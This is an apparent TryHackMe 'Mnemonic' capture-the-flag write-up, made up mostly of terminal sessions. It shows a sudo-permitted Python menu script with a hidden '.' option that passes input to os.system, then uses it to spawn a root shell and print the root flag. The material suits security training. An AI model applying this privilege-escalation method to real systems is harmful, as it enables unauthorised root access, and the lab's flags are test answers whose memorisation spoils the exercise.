
```sh
┌──(kali㉿kali)-[~/thm/mnemonic]
└─$ ssh condor@10.10.122.251 -p 1337
The authenticity of host '[10.10.122.251]:1337 ([10.10.122.251]:1337)' can't be established.
ED25519 key fingerprint is SHA256:d0qdox4vOIS0HPDVlfu4FnWGZII6QM4tKJVBvWhlSp0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.122.251]:1337' (ED25519) to the list of known hosts.
condor@10.10.122.251's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


51 packages can be updated.
0 updates are security updates.


Last login: Tue Jul 14 17:58:10 2020 from 192.168.1.6
condor@mnemonic:~$ ls -la
total 36
drwxr--r--  6 condor condor 4096 Jul 14  2020  .
drwxr-xr-x 10 root   root   4096 Jul 14  2020  ..
drwxr-xr-x  2 root   root   4096 Jul 13  2020 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
lrwxrwxrwx  1 root   root      9 Jul 14  2020  .bash_history -> /dev/null
-rw-r--r--  1 condor condor  220 Jul 13  2020  .bash_logout
-rw-r--r--  1 condor condor 3771 Jul 13  2020  .bashrc
drwx------  2 condor condor 4096 Jul 14  2020  .cache
drwx------  3 condor condor 4096 Jul 14  2020  .gnupg
-rw-r--r--  1 condor condor  807 Jul 13  2020  .profile
drwxr-xr-x  2 root   root   4096 Jul 13  2020 ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
condor@mnemonic:~$ cd aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw\=\=/
condor@mnemonic:~/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==$ ls -la
total 8
drwxr-xr-x 2 root   root   4096 Jul 13  2020 .
drwxr--r-- 6 condor condor 4096 Jul 14  2020 ..
condor@mnemonic:~/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==$ cd ..
condor@mnemonic:~$ cd ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
condor@mnemonic:~/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='$ ls -la
total 12
drwxr-xr-x 2 root   root   4096 Jul 13  2020 .
drwxr--r-- 6 condor condor 4096 Jul 14  2020 ..
-rw-r--r-- 1 root   root    292 Jul 13  2020 index.html
condor@mnemonic:~/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='$ cat index.html 
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /1/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='/</title>
<body>
<h2>Directory listing for /1/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='/</h2>
<hr>
<ul>
</ul>
<hr>
</body>
</html>
condor@mnemonic:~/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='$ cd ..
```

```sh
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
condor@mnemonic:~$ cd /bin
condor@mnemonic:/bin$ cat examplecode.py
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print 


        print("""

        ------------information systems script beta--------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ----------------@author villwocki------------------""")
        time.sleep(2)
        print("\nRunning...")
        time.sleep(2)
        os.system(command="clear")
        main()


def main():
        info()
        while True:
                select = int(input("\nSelect:"))

                if select == 1:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ip a")
                        print("Main Menü press '0' ")
                        print(x)

                if select == 2:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ifconfig")
                        print(x)

                if select == 3:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ip route show")
                        print(x)

                if select == 4:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="cat /etc/os-release")
                        print(x)

                if select == 0: 
                        time.sleep(1)
                        ex = str(input("are you sure you want to quit ? yes : "))

                        if ex == ".":
                                print(os.system(input("\nRunning....")))
                        if ex == "yes " or "y":
                                sys.exit()
                      

                if select == 5:                     #root
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(2)
                        print(".......")
                        time.sleep(2)
                        print("System rebooting....")
                        time.sleep(2)
                        x = os.system(command="shutdown now")
                        print(x)

                if select == 6:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="date")
                        print(x)




                if select == 7:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="rm -r /tmp/*")
                        print(x)

                      
              


       


            

def info():                         #info print function
        print("""

        #Network Connections   [1]

        #Show İfconfig         [2]

        #Show ip route         [3]

        #Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

        #Exit                  [0]

        """)

def run(): # run function 
        text()

run()
condor@mnemonic:/bin$
condor@mnemonic:/bin$ ls -la examplecode.py 
-rw-r--r-- 1 root root 2352 Jul 15  2020 examplecode.py
condor@mnemonic:/bin$ sudo /usr/bin/python3 /bin/examplecode.py

```

sudo /usr/bin/python3 /bin/examplecode.py

we got the menu with root perms

code:
```python
                if select == 0: 
                        time.sleep(1)
                        ex = str(input("are you sure you want to quit ? yes : "))

							if ex == ".":
                                print(os.system(input("\nRunning....")))
```

When quitting with 0 we pressed . and get the Running... text

we then wrote /bin/bash and:

```sh
Select:0
are you sure you want to quit ? yes : .

Running..../bin/bash
root@mnemonic:/bin# 

root@mnemonic:/# cd /root
root@mnemonic:/root# ls -la
total 44
drwx------  6 root root 4096 Jul 15  2020 .
drwxr-xr-x 24 root root 4096 Jul 13  2020 ..
lrwxrwxrwx  1 root root    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Jul 13  2020 .cache
-rw-r--r--  1 root root  221 Mar 26 15:01 f2.txt
drwx------  3 root root 4096 Jul 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jul 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   36 Jul 13  2020 root.txt
drwx------  2 root root 4096 Jul 13  2020 .ssh
-rw-------  1 root root    0 Jul 15  2020 .viminfo
-rw-r--r--  1 root root  165 Jul 14  2020 .wget-hsts
root@mnemonic:/root# cat f2.txt
b' 15:01:57 up 19 min,  1 user,  load average: 0.00, 0.03, 0.16\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\ncondor   pts/0    10.18.21.236     14:45    3.00s  0.09s  0.01s sshd: condor [priv] \n'root@mnemonic:/root# 
root@mnemonic:/root# cat root.txt
THM{congratulationsyoumadeithashme}
```

THM{congratulationsyoumadeithashme}

lol

congratulationsyoumadeithashme


